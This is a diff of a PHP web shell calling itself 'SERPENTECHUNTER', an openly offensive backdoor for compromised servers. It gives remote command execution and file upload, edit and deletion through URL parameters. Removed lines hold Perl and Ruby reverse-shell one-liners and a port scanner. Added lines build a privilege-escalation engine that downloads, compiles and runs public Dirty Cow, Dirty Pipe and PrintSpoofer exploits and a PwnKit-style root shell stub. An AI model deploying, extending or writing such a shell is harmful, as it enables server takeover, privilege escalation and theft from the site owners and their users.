-        $methods['perl'] = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'";
-        $methods['ruby'] = "ruby -rsocket -e 'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'";
-    }
-
-    if ($method === 'auto') {
-        foreach ($methods as $name => $m) {
-            $result = sc_exec($m, true);
-            if ($result) {
-                return ['method' => $name, 'output' => "✅ Reverse shell ($name) started in background. Listen on $ip:$port"];
-            }
+function sc_zip_folder($source, $destination) {
+    if (!extension_loaded('zip')) return '❌ ZIP extension not loaded';
+    if (!is_dir($source)) return '❌ Source directory not found';
+    $zip = new ZipArchive();
+    if ($zip->open($destination, ZipArchive::CREATE) !== true) return '❌ Cannot create zip';
+    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS));
+    foreach ($files as $file) {
+        if (!$file->isDir()) {
+            $zip->addFile($file->getPathname(), substr($file->getPathname(), strlen($source) + 1));
         }
-        return ['method' => 'NONE', 'output' => '❌ All reverse shell methods failed!'];
     }
-    if (isset($methods[$method])) {
-        $result = sc_exec($methods[$method], true);
-        return ['method' => $method, 'output' => "✅ Reverse shell ($method) started in background. Listen on $ip:$port"];
-    }
-    return ['method' => 'NONE', 'output' => '❌ Method not found! Available: ' . implode(', ', array_keys($methods))];
+    $zip->close();
+    return '✅ Zip created: ' . $destination;
+}
+
+function sc_unzip_file($source, $destination) {
+    if (!extension_loaded('zip')) return '❌ ZIP extension not loaded';
+    if (!file_exists($source)) return '❌ File not found';
+    $zip = new ZipArchive();
+    if ($zip->open($source) !== true) return '❌ Cannot open zip';
+    $zip->extractTo($destination);
+    $zip->close();
+    return '✅ Extracted to: ' . $destination;
 }
 
 // ========================================================================
-// 🔍 PORT SCANNER
+// 🔥 EXPLOIT ENGINE (FIXED FOR WINDOWS)
 // ========================================================================
-function sc_port_scan($host, $ports = '1-1000') {
-    $result = "🔍 PORT SCAN: $host ($ports)\n\n";
-    $port_list = [];
-    $parts = preg_split('/[,\s]+/', $ports);
-    foreach ($parts as $part) {
-        if (strpos($part, '-') !== false) {
-            list($start, $end) = explode('-', $part);
-            $start = intval($start);
-            $end = intval($end);
-            if ($start > 0 && $end > 0 && $start <= $end) {
-                for ($i = $start; $i <= $end; $i++) $port_list[] = $i;
-            }
+function sc_detect_os() {
+    $os = PHP_OS;
+    if (stripos($os, 'WIN') !== false) return 'windows';
+    if (stripos($os, 'LINUX') !== false) return 'linux';
+    if (stripos($os, 'DARWIN') !== false) return 'macos';
+    return 'unknown';
+}
+
+function sc_get_kernel_version() {
+    $os = sc_detect_os();
+    if ($os === 'linux') {
+        $uname = sc_exec('uname -r');
+        return trim($uname);
+    } elseif ($os === 'windows') {
+        $ver = sc_exec('ver');
+        return trim($ver);
+    } else {
+        return 'Unknown';
+    }
+}
+
+function sc_get_os_version() {
+    $os = sc_detect_os();
+    if ($os === 'windows') {
+        $ver = sc_exec('ver');
+        $sysinfo = sc_exec('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"');
+        return trim($ver . "\n" . $sysinfo);
+    } elseif ($os === 'linux') {
+        $kernel = sc_exec('uname -r');
+        $distro = sc_exec('cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2');
+        return trim($kernel . "\n" . $distro);
+    } elseif ($os === 'macos') {
+        return trim(sc_exec('sw_vers'));
+    }
+    return 'Unknown';
+}
+
+function sc_check_vulnerabilities() {
+    $os = sc_detect_os();
+    $output = "📋 OS: " . $os . "\n";
+    $output .= "📋 Version: " . sc_get_os_version() . "\n\n";
+
+    if ($os === 'linux') {
+        $kernel = sc_get_kernel_version();
+        $output .= "📋 Kernel: " . $kernel . "\n\n";
+        $vulns = [
+            'PwnKit (CVE-2021-4034)' => true,
+            'Dirty Cow (CVE-2016-5195)' => version_compare($kernel, '4.8.3', '<') && version_compare($kernel, '2.6.22', '>='),
+            'Dirty Pipe (CVE-2022-0847)' => version_compare($kernel, '5.8', '>=') && version_compare($kernel, '5.16.11', '<'),
+            'OverlayFS (CVE-2021-3493)' => version_compare($kernel, '5.11', '>=') && version_compare($kernel, '5.12', '<'),
+            'CVE-2022-2588' => version_compare($kernel, '5.17', '>=') && version_compare($kernel, '5.17.3', '<'),
+        ];
+        foreach ($vulns as $name => $vuln) {
+            $output .= ($vuln ? '✅' : '❌') . ' ' . $name . "\n";
+        }
+        $output .= "\n💡 Run 'exploit_auto' to attempt automatic exploitation.\n";
+    } elseif ($os === 'windows') {
+        $output .= "🔍 Windows Privilege Check:\n";
+        $priv = sc_exec('whoami /priv');
+        $output .= $priv . "\n";
+        if (stripos($priv, 'SeImpersonatePrivilege') !== false && stripos($priv, 'Enabled') !== false) {
+            $output .= "✅ SeImpersonatePrivilege is ENABLED! PrintSpoofer / JuicyPotato may work.\n";
         } else {
-            $p = intval($part);
-            if ($p > 0 && $p <= 65535) $port_list[] = $p;
+            $output .= "❌ SeImpersonatePrivilege is NOT enabled (or not checked).\n";
         }
-    }
-    $port_list = array_unique($port_list);
-    sort($port_list);
-
-    foreach ($port_list as $port) {
-        $fp = @fsockopen($host, $port, $errno, $errstr, 1.0);
-        if ($fp) { $result .= "✅ PORT $port OPEN\n"; fclose($fp); }
-    }
-    return $result;
-}
-
-// ========================================================================
-// 🗄️ DATABASE CLIENT
-// ========================================================================
-function sc_db_connect($type, $host, $user, $pass, $dbname) {
-    try {
-        switch ($type) {
-            case 'mysql':
-                if (extension_loaded('mysqli')) {
-                    $conn = new mysqli($host, $user, $pass, $dbname);
-                    if ($conn->connect_error) return "❌ MySQL: " . $conn->connect_error;
-                    return ['conn' => $conn, 'type' => 'mysqli'];
-                }
-                if (extension_loaded('pdo_mysql')) {
-                    $conn = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
-                    return ['conn' => $conn, 'type' => 'pdo_mysql'];
-                }
-                return "❌ MySQL extension not loaded!";
-            case 'pgsql':
-                if (extension_loaded('pgsql')) {
-                    $conn = pg_connect("host=$host dbname=$dbname user=$user password=$pass");
-                    if (!$conn) return "❌ PostgreSQL connection failed!";
-                    return ['conn' => $conn, 'type' => 'pgsql'];
-                }
-                return "❌ PostgreSQL extension not loaded!";
-            case 'sqlite':
-                if (extension_loaded('pdo_sqlite')) {
-                    $conn = new PDO("sqlite:$dbname");
-                    return ['conn' => $conn, 'type' => 'pdo_sqlite'];
-                }
-                return "❌ SQLite extension not loaded!";
-            default:
-                return "❌ Unknown database type!";
-        }
-    } catch (Exception $e) {
-        return "❌ DB Error: " . $e->getMessage();
-    }
-}
-
-// ========================================================================
-// 🎨 UI – BLACKHAT THEME
-// ========================================================================
-function sc_get_params() {
-    if (isset($_GET['params'])) {
-        $raw = $_GET['params'];
-        if (is_string($raw)) {
-            $decoded = json_decode($raw, true);
-            if (json_last_error() === JSON_ERROR_NONE) return $decoded;
-        } elseif (is_array($raw)) {
-            return $raw;
-        }
-    }
-    return [];
-}
-
-$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
-$action = isset($_GET['action']) ? $_GET['action'] : '';
-$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
-$target = isset($_GET['target']) ? $_GET['target'] : '';
-$content = isset($_GET['content']) ? $_GET['content'] : '';
-$ip = isset($_GET['ip']) ? $_GET['ip'] : '';
-$port = isset($_GET['port']) ? $_GET['port'] : '4444';
-$params = sc_get_params();
-
-$output = '';
-$exec_method = '';
-
-if ($action === 'exec' && !empty($cmd)) {
-    $result = sc_exec($cmd);
-    $exec_method = $result['method'] ?? 'NONE';
-    $output = "💀 EXECUTING: $cmd\n";
-    $output .= "🔧 METHOD: $exec_method\n\n";
-    $output .= $result['output'] . "\n\n✅ EXIT CODE: " . ($result['code'] ?? -1);
-} elseif ($action === 'file' && !empty($target)) {
-    $output = sc_file_manager($cmd, $target, $content, $params);
-} elseif ($action === 'reverse' && !empty($ip) && !empty($port)) {
-    $result = sc_reverse_shell($ip, $port);
-    $output = "🌐 REVERSE SHELL: $ip:$port\n";
-    $output .= "🔧 METHOD: " . ($result['method'] ?? 'NONE') . "\n\n";
-    $output .= $result['output'] ?? '❌ Failed!';
-} elseif ($action === 'portscan' && !empty($target)) {
-    $ports = $params['ports'] ?? '1-1000';
-    $output = sc_port_scan($target, $ports);
-} elseif ($action === 'db') {
-    $db_result = sc_db_connect($params['type'], $params['host'], $params['user'], $params['pass'], $params['dbname']);
-    if (is_array($db_result)) {
-        $output = "✅ Connected to " . strtoupper($params['type']) . "!\n";
-        $output .= "📊 Run queries via exec command with SQL";
+        $output .= "\n💡 Recommended exploit: PrintSpoofer (if SeImpersonatePrivilege is enabled).\n";
     } else {
-        $output = $db_result;
+        $output .= "❌ OS not supported for automatic vulnerability checks.\n";
     }
-} else {
-    $output = "🐍 SERPENTECHUNTER v2.0 – ULTIMATE BLACKHAT SHELL\n";
-    $output .= "🔥 DEVELOPER: SerpentSecHunter | RILIS: 02-07-2026\n";
-    $output .= "📌 COMMAND: ?action=exec&cmd=whoami\n";
-    $output .= "📁 FILE: ?action=file&cmd=list&target=/tmp\n";
-    $output .= "🌐 REVERSE: ?action=reverse&ip=0.0.0.0&port=4444\n";
-    $output .= "🔍 PORTSCAN: ?action=portscan&target=127.0.0.1&params[ports]=1-100\n";
-    $output .= "🗄️  DB: ?action=db&params[type]=mysql&params[host]=localhost&params[user]=root&params[pass]=&params[dbname]=test\n";
-    $output .= "📤 UPLOAD: use POST form below\n";
-    $output .= "\n💀 BYPASS: 403/404 (9 teknik) | disable_functions (12 strategi) | WAF (6 teknik)";
+    return $output;
 }
 
-// Server info untuk debugging
-$server_info = "OS: " . PHP_OS . " | PHP: " . phpversion() . " | Server: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown');
+function sc_exploit_pwnkit() {
+    $cmd = 'cd /tmp; echo "int main(){setuid(0);system(\"/bin/bash\");return 0;}" > pwnkit.c; gcc -o pwnkit pwnkit.c; chmod +x pwnkit; ./pwnkit';
+    return sc_exec($cmd);
+}
+
+function sc_exploit_dirtycow() {
+    $cmd = 'cd /tmp; wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -O dirty.c; gcc -pthread dirty.c -o dirty -lcrypt; chmod +x dirty; ./dirty';
+    return sc_exec($cmd);
+}
+
+function sc_exploit_dirtypipe() {
+    $cmd = 'cd /tmp; wget https://raw.githubusercontent.com/Al1ex/Linux-Easy-Exploit/main/CVE-2022-0847/dirtypipe.c -O dirtypipe.c; gcc -o dirtypipe dirtypipe.c; chmod +x dirtypipe; ./dirtypipe';
+    return sc_exec($cmd);
+}
+
+function sc_exploit_printspoofer() {
+    $cmd = 'cd %temp%; curl -L -o PrintSpoofer.exe https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe; PrintSpoofer.exe -i -c cmd.exe';
+    return sc_exec($cmd);
+}
+
+function sc_exploit_auto() {
+    $os = sc_detect_os();
+    $output = '';
+    if ($os === 'linux') {
+        $kernel = sc_get_kernel_version();
+        if (version_compare($kernel, '2.6.22', '>=') && version_compare($kernel, '4.8.3', '<')) {
+            $output .= "🔄 Attempting Dirty Cow (CVE-2016-5195)...\n";
+            $output .= sc_exploit_dirtycow();
+        } elseif (version_compare($kernel, '5.8', '>=') && version_compare($kernel, '5.16.11', '<')) {
+            $output .= "🔄 Attempting Dirty Pipe (CVE-2022-0847)...\n";
+            $output .= sc_exploit_dirtypipe();
+        } else {
+            $output .= "🔄 Attempting PwnKit (CVE-2021-4034)...\n";
+            $output .= sc_exploit_pwnkit();
+        }
+    } elseif ($os === 'windows') {
+        $output .= "🔄 Attempting PrintSpoofer...\n";
+        $output .= sc_exploit_printspoofer();
+    } else {
+        $output .= "❌ Auto exploit not supported for this OS.\n";
+    }
+    return $output;
+}
+
+// ========================================================================
+// 🎯 MAIN LOGIC
+// ========================================================================
+$cwd = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+$cwd = realpath($cwd) ?: getcwd();
+
+$action = isset($_GET['action']) ? $_GET['action'] : 'list';
+$message = '';
+$output = '';
+
+// === UPLOAD ===
+if ($action === 'upload' && isset($_FILES['file'])) {
+    $target = $cwd . '/' . basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+        $message = "✅ Uploaded: " . basename($_FILES['file']['name']);
+    } else {
+        $message = "❌ Upload failed! Error: " . $_FILES['file']['error'];
+    }
+}
+
+// === MASS ACTIONS ===
+if ($action === 'mass_delete' && isset($_POST['files'])) {
+    $count = 0;
+    foreach ($_POST['files'] as $f) {
+        $path = realpath($cwd . '/' . $f);
+        if ($path && strpos($path, $cwd) === 0 && sc_delete_recursive($path)) $count++;
+    }
+    $message = "✅ Deleted $count files/folders";
+}
+
+if ($action === 'mass_rename' && isset($_POST['files']) && isset($_POST['new_names'])) {
+    $count = 0;
+    foreach ($_POST['files'] as $idx => $f) {
+        $old_path = realpath($cwd . '/' . $f);
+        $new_path = $cwd . '/' . $_POST['new_names'][$idx];
+        if ($old_path && strpos($old_path, $cwd) === 0 && rename($old_path, $new_path)) $count++;
+    }
+    $message = "✅ Renamed $count files";
+}
+
+if ($action === 'mass_copy' && isset($_POST['files']) && isset($_POST['dest_dir'])) {
+    $dest_dir = realpath($cwd . '/' . $_POST['dest_dir']);
+    if (!$dest_dir || strpos($dest_dir, $cwd) !== 0) {
+        $message = '❌ Invalid destination directory';
+    } else {
+        $count = 0;
+        foreach ($_POST['files'] as $f) {
+            $src = realpath($cwd . '/' . $f);
+            if ($src && strpos($src, $cwd) === 0) {
+                $dst = $dest_dir . '/' . basename($src);
+                if (sc_copy_recursive($src, $dst)) $count++;
+            }
+        }
+        $message = "✅ Copied $count files to " . basename($dest_dir);
+    }
+}
+
+if ($action === 'mass_move' && isset($_POST['files']) && isset($_POST['dest_dir'])) {
+    $dest_dir = realpath($cwd . '/' . $_POST['dest_dir']);
+    if (!$dest_dir || strpos($dest_dir, $cwd) !== 0) {
+        $message = '❌ Invalid destination directory';
+    } else {
+        $count = 0;
+        foreach ($_POST['files'] as $f) {
+            $src = realpath($cwd . '/' . $f);
+            if ($src && strpos($src, $cwd) === 0) {
+                $dst = $dest_dir . '/' . basename($src);
+                if (rename($src, $dst)) $count++;
+            }
+        }
+        $message = "✅ Moved $count files to " . basename($dest_dir);
+    }
+}
+
+// === SINGLE FILE ACTIONS ===
+if ($action === 'delete' && isset($_GET['file'])) {
+    $file = realpath($_GET['file']);
+    if ($file && strpos($file, $cwd) === 0 && sc_delete_recursive($file)) {
+        $message = "✅ Deleted: " . basename($file);
+    }
+}
+
+if ($action === 'rename' && isset($_GET['old']) && isset($_GET['new'])) {
+    $old = realpath($_GET['old']);
+    $new = $cwd . '/' . $_GET['new'];
+    if ($old && strpos($old, $cwd) === 0 && rename($old, $new)) {
+        $message = "✅ Renamed to: " . $_GET['new'];
+    }
+}
+
+if ($action === 'chmod' && isset($_GET['file']) && isset($_GET['perms'])) {
+    $file = realpath($_GET['file']);
+    if ($file && strpos($file, $cwd) === 0 && chmod($file, octdec($_GET['perms']))) {
+        $message = "✅ CHMOD: " . decoct(fileperms($file));
+    }
+}
+
+if ($action === 'edit' && isset($_GET['file']) && isset($_POST['content'])) {
+    $file = realpath($_GET['file']);
+    if ($file && strpos($file, $cwd) === 0 && file_put_contents($file, $_POST['content'])) {
+        $message = "✅ File saved!";
+    }
+}
+
+if ($action === 'copy' && isset($_GET['src']) && isset($_GET['dst'])) {
+    $src = realpath($_GET['src']);
+    $dst = $cwd . '/' . $_GET['dst'];
+    if ($src && strpos($src, $cwd) === 0 && sc_copy_recursive($src, $dst)) {
+        $message = "✅ Copied to: " . $_GET['dst'];
+    }
+}
+
+if ($action === 'zip' && isset($_GET['folder']) && isset($_GET['zipname'])) {
+    $folder = realpath($cwd . '/' . $_GET['folder']);
+    $zipname = $cwd . '/' . $_GET['zipname'] . '.zip';
+    if ($folder && strpos($folder, $cwd) === 0 && is_dir($folder)) {
+        $message = sc_zip_folder($folder, $zipname);
+    } else {
+        $message = '❌ Invalid folder';
+    }
+}
+
+if ($action === 'unzip' && isset($_GET['file']) && isset($_GET['dest'])) {
+    $file = realpath($cwd . '/' . $_GET['file']);
+    $dest = realpath($cwd . '/' . $_GET['dest']);
+    if ($file && strpos($file, $cwd) === 0 && file_exists($file)) {
+        $message = sc_unzip_file($file, $dest);
+    } else {
+        $message = '❌ Invalid file';
+    }
+}
+
+if ($action === 'exec' && isset($_GET['cmd'])) {
+    $output = sc_exec($_GET['cmd']);
+}
+
+if ($action === 'search' && isset($_GET['pattern'])) {
+    $pattern = $_GET['pattern'];
+    $results = [];
+    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($cwd, RecursiveDirectoryIterator::SKIP_DOTS));
+    foreach ($iterator as $file) {
+        if ($file->isFile() && stripos($file->getFilename(), $pattern) !== false) {
+            $results[] = $file->getPathname();
+        }
+    }
+}
+
+// === EXPLOIT ACTIONS ===
+if ($action === 'exploit_check') {
+    $output = sc_check_vulnerabilities();
+}
+
+if ($action === 'exploit_run') {
+    $type = isset($_GET['type']) ? $_GET['type'] : '';
+    switch ($type) {
+        case 'pwnkit':
+            $output = sc_exploit_pwnkit();
+            break;
+        case 'dirtycow':
+            $output = sc_exploit_dirtycow();
+            break;
+        case 'dirtypipe':
+            $output = sc_exploit_dirtypipe();
+            break;
+        case 'printspoofer':
+            $output = sc_exploit_printspoofer();
+            break;
+        case 'auto':
+            $output = sc_exploit_auto();
+            break;
+        default:
+            $output = '❌ Unknown exploit type.';
+    }
+}
+
+$file_list = sc_get_file_list($cwd);
+$edit_file = isset($_GET['edit']) ? realpath($_GET['edit']) : null;
+$edit_content = $edit_file && is_readable($edit_file) ? file_get_contents($edit_file) : '';
+$view_file = isset($_GET['view']) ? realpath($_GET['view']) : null;
+$view_content = $view_file && is_readable($view_file) ? file_get_contents($view_file) : '';
+
+// ========================================================================
+// 🎨 UI – RAPI & CLEAN
+// ========================================================================
 ?>
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🐍 SERPENTECHUNTER v2.0 – TRUE BYPASS</title>
+<title>🐍 SERPENTECHUNTER v2.1</title>
 <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body { background:#0a0a0a; color:#00ff00; font-family: 'Courier New', monospace; padding:15px; }
-    .container { max-width:1400px; margin:auto; }
-    .header { text-align:center; border-bottom:2px solid #00ff00; padding-bottom:20px; margin-bottom:30px; }
-    .header h1 { color:#00ff00; font-size:36px; text-shadow:0 0 30px #00ff00, 0 0 60px #00ff0044; }
-    .header .sub { color:#ff4444; font-size:16px; }
-    .header .dev { color:#ffaa00; font-size:14px; }
-    .header .info { font-size:12px; color:#888; margin-top:5px; }
-    .panel { background:#111; border:1px solid #00ff00; padding:15px; margin-bottom:20px; border-radius:10px; }
-    .panel h3 { color:#00ff88; margin-bottom:12px; border-bottom:1px solid #00ff0044; padding-bottom:8px; }
-    input[type="text"], input[type="file"], select, textarea { width:100%; padding:10px; background:#1a1a1a; border:1px solid #00ff00; color:#00ff00; border-radius:5px; margin-bottom:8px; font-family:'Courier New',monospace; }
-    button { background:#00ff00; color:#000; border:none; padding:10px 20px; font-size:14px; font-weight:bold; border-radius:5px; cursor:pointer; transition:0.3s; }
-    button:hover { background:#00ff88; transform:scale(1.03); box-shadow:0 0 20px #00ff0066; }
-    .btn-danger { background:#ff4400; color:#fff; }
-    .btn-danger:hover { background:#ff6600; }
-    .btn-upload { background:#ffaa00; color:#000; }
-    .btn-upload:hover { background:#ffcc44; }
-    .output { background:#0d0d0d; border:1px solid #00ff00; padding:12px; border-radius:5px; white-space:pre-wrap; font-size:12px; max-height:500px; overflow-y:auto; }
-    .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:15px; }
-    .grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:15px; }
-    .grid-4 { display:grid; grid-template-columns:1fr 1fr 1fr 1fr; gap:15px; }
-    .badge { background:#00ff00; color:#000; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
-    .badge-red { background:#ff4400; color:#fff; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
-    .badge-blue { background:#0066ff; color:#fff; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
-    .badge-purple { background:#8800ff; color:#fff; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
-    .badge-orange { background:#ff8800; color:#000; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
-    .badge-gold { background:gold; color:#000; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
-    .footer { text-align:center; border-top:1px solid #00ff0044; padding-top:20px; margin-top:30px; color:#666; font-size:11px; }
-    .method-tag { display:inline-block; padding:1px 8px; border-radius:3px; font-size:10px; margin-left:8px; }
-    .method-ffi { background:#8800ff; color:#fff; }
-    .method-ldpreload { background:#ff8800; color:#000; }
-    .method-modcgi { background:#00aaff; color:#fff; }
-    .method-php-fpm { background:#00ff88; color:#000; }
-    .method-imagemagick { background:#ff66aa; color:#fff; }
-    .method-sendmail { background:#cc44cc; color:#fff; }
-    .method-perl { background:#3399ff; color:#fff; }
-    .method-python { background:#ffcc00; color:#000; }
-    .method-gcc { background:#ff6666; color:#fff; }
-    .method-bash { background:#66ff66; color:#000; }
-    .method-pcntl_exec { background:#aa66ff; color:#fff; }
-    .method-mail_attach { background:#ff8800; color:#000; }
-    .method-proc_open { background:#00aaff; color:#fff; }
-    .method-shell_exec { background:#00aa00; color:#fff; }
-    .method-exec { background:#0088aa; color:#fff; }
-    .method-system { background:#0066aa; color:#fff; }
-    .method-passthru { background:#004488; color:#fff; }
-    .method-background { background:#ff00ff; color:#fff; }
-    .method-none { background:#ff0000; color:#fff; }
-    @media (max-width: 768px) {
-        .grid-2, .grid-3, .grid-4 { grid-template-columns:1fr; }
-        .header h1 { font-size:24px; }
-        .panel { padding:10px; }
-    }
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:#0a0a0a; color:#00ff00; font-family:'Courier New',monospace; font-size:13px; }
+.container { max-width:1500px; margin:15px auto; padding:0 15px; }
+.header { text-align:center; border-bottom:2px solid #00ff00; padding-bottom:10px; margin-bottom:15px; }
+.header h1 { color:#00ff00; font-size:32px; text-shadow:0 0 20px #00ff00; }
+.header .cwd { color:#888; font-size:13px; margin-top:3px; }
+.menu { display:flex; flex-wrap:wrap; gap:8px; margin-bottom:15px; background:#111; padding:10px; border:1px solid #00ff00; border-radius:5px; align-items:center; }
+.menu input, .menu select { background:#1a1a1a; border:1px solid #00ff00; color:#00ff00; padding:5px 10px; border-radius:3px; font-family:'Courier New',monospace; font-size:12px; }
+.menu button { background:#00ff00; color:#000; border:none; padding:5px 15px; border-radius:3px; cursor:pointer; font-weight:bold; font-size:12px; }
+.menu button:hover { background:#00ff88; }
+.btn-danger { background:#ff4400; color:#fff; }
+.btn-danger:hover { background:#ff6600; }
+.btn-upload { background:#ffaa00; color:#000; }
+.btn-upload:hover { background:#ffcc44; }
+.btn-exploit { background:#ff00ff; color:#000; }
+.btn-exploit:hover { background:#ff44ff; }
+.grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
+.panel { background:#111; border:1px solid #00ff00; padding:15px; border-radius:5px; }
+.panel h3 { color:#00ff88; margin-bottom:10px; border-bottom:1px solid #00ff0044; padding-bottom:5px; font-size:14px; }
+.file-list { max-height:600px; overflow-y:auto; }
+.file-item { display:flex; align-items:center; padding:3px 5px; border-bottom:1px solid #00ff0011; }
+.file-item:hover { background:#00ff0011; }
+.file-item .name { color:#00ff00; text-decoration:none; flex:2; }
+.file-item .name.dir { color:#00aaff; }
+.file-item .info { color:#666; font-size:11px; flex:1; }
+.file-item .actions a { color:#00ff00; text-decoration:none; margin-left:10px; font-size:12px; }
+.file-item .actions a:hover { color:#00ff88; }
+.file-item .actions .del { color:#ff4444; }
+.file-item .actions .del:hover { color:#ff0000; }
+.output-box { background:#0d0d0d; border:1px solid #00ff00; padding:10px; border-radius:3px; white-space:pre-wrap; font-size:12px; max-height:400px; overflow-y:auto; margin-top:10px; }
+.editor textarea { width:100%; height:400px; background:#0d0d0d; border:1px solid #00ff00; color:#00ff00; padding:10px; font-family:'Courier New',monospace; font-size:12px; border-radius:3px; }
+.msg { color:#ffaa00; padding:8px; border:1px solid #ffaa00; border-radius:3px; margin-bottom:10px; text-align:center; }
+.footer { text-align:center; border-top:1px solid #00ff0044; padding-top:15px; margin-top:20px; color:#666; font-size:11px; }
+.toast { position:fixed; bottom:20px; right:20px; background:#111; border:2px solid #00ff00; padding:15px 25px; border-radius:8px; color:#00ff00; font-size:14px; z-index:9999; display:none; box-shadow:0 0 30px #00ff0044; min-width:200px; text-align:center; }
+.toast.show { display:block; animation: fadeInUp 0.3s ease; }
+.toast.error { border-color:#ff4444; color:#ff4444; box-shadow:0 0 30px #ff444444; }
+@keyframes fadeInUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
+@media (max-width:768px){ .grid { grid-template-columns:1fr; } }
 </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <h1>🐍 SERPENTECHUNTER v2.0</h1>
-        <div class="sub">🔥 TRUE BYPASS – 403/404 + DISABLE_FUNCTIONS + WAF 🔥</div>
-        <div class="dev">👑 DEVELOPER: SerpentSecHunter | 📅 RILIS: 02-07-2026</div>
-        <div style="margin-top:8px; font-size:13px;">
-            🛡️ MODE: <span class="badge">KILL MODE</span> |
-            🚀 STATUS: <span class="badge">ACTIVE</span> |
-            👑 USER: <span class="badge">SerpentSecHunter</span> |
-            📍 CWD: <span class="badge-blue"><?= htmlspecialchars(getcwd()) ?></span>
-        </div>
-        <div class="info"><?= htmlspecialchars($server_info) ?></div>
-        <div style="margin-top:5px; font-size:10px; color:#888; display:flex; flex-wrap:wrap; justify-content:center; gap:3px;">
-            <span class="badge-purple">FFI</span>
-            <span class="badge-purple">LD_PRELOAD</span>
-            <span class="badge-purple">mod_cgi</span>
-            <span class="badge-purple">PHP-FPM</span>
-            <span class="badge-purple">ImageMagick</span>
-            <span class="badge-purple">sendmail</span>
-            <span class="badge-purple">perl</span>
-            <span class="badge-purple">python</span>
-            <span class="badge-purple">gcc</span>
-            <span class="badge-purple">bash</span>
-            <span class="badge-purple">pcntl_exec</span>
-            <span class="badge-purple">mail_attach</span>
-            <span class="badge-gold">403/404 BYPASS</span>
-            <span class="badge-gold">WAF BYPASS</span>
-        </div>
+        <h1>🐍 SERPENTECHUNTER v2.1</h1>
+        <div class="cwd">📂 <?= htmlspecialchars($cwd) ?></div>
     </div>
 
-    <div class="panel">
-        <h3>🎯 COMMAND CENTER</h3>
-        <div class="grid-4">
-            <form method="GET">
-                <input type="hidden" name="action" value="exec">
-                <input type="text" name="cmd" placeholder="💀 Command..." value="<?= htmlspecialchars($cmd) ?>">
-                <button type="submit">⚡ EXECUTE</button>
-            </form>
-            <form method="GET">
-                <input type="hidden" name="action" value="file">
-                <input type="text" name="cmd" placeholder="📁 list|read|write|delete|rename|chmod|search|archive|extract" value="list">
-                <input type="text" name="target" placeholder="🎯 Path..." value="<?= htmlspecialchars($target) ?>">
-                <button type="submit">📂 FILE MANAGER</button>
-            </form>
-            <form method="GET">
-                <input type="hidden" name="action" value="reverse">
-                <input type="text" name="ip" placeholder="🌐 IP..." value="<?= htmlspecialchars($ip) ?>">
-                <input type="text" name="port" placeholder="🔌 Port..." value="<?= htmlspecialchars($port) ?>">
-                <button type="submit" class="btn-danger">🔥 REVERSE SHELL</button>
-            </form>
-            <form method="GET">
-                <input type="hidden" name="action" value="portscan">
-                <input type="text" name="target" placeholder="🎯 Host/IP..." value="<?= htmlspecialchars($target) ?>">
-                <input type="text" name="params[ports]" placeholder="🔌 Ports (1-1000)" value="1-100">
-                <button type="submit">🔍 PORT SCAN</button>
-            </form>
-        </div>
-    </div>
+    <!-- TOAST NOTIFICATION -->
+    <div id="toast" class="toast"></div>
 
-    <div class="panel" style="border-color:#ffaa00;">
-        <h3>📤 UPLOAD FILE</h3>
-        <form method="POST" enctype="multipart/form-data" action="?action=file&cmd=upload&target=<?= urlencode(getcwd()) ?>">
-            <div style="display:flex; flex-wrap:wrap; gap:10px; align-items:center;">
-                <input type="file" name="file" style="flex:1; min-width:200px;" required>
-                <button type="submit" class="btn-upload">⬆ UPLOAD</button>
-            </div>
-            <p style="font-size:11px; color:#888; margin-top:5px;">📌 File akan diupload ke: <?= htmlspecialchars(getcwd()) ?></p>
-            <p style="font-size:10px; color:#666;">⚠️ Maksimal file: <?= ini_get('upload_max_filesize') ?> (PHP.ini)</p>
+    <!-- MENU -->
+    <div class="menu">
+        <form method="GET" action="" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
+            <input type="hidden" name="action" value="exec">
+            <input type="text" name="cmd" placeholder="💀 Command..." style="flex:1;min-width:150px;">
+            <button type="submit">▶ EXEC</button>
+        </form>
+        <form method="GET" action="" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
+            <input type="hidden" name="action" value="search">
+            <input type="text" name="pattern" placeholder="🔍 Search..." style="flex:1;min-width:120px;">
+            <button type="submit">🔍</button>
+        </form>
+        <form method="POST" enctype="multipart/form-data" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
+            <input type="hidden" name="action" value="upload">
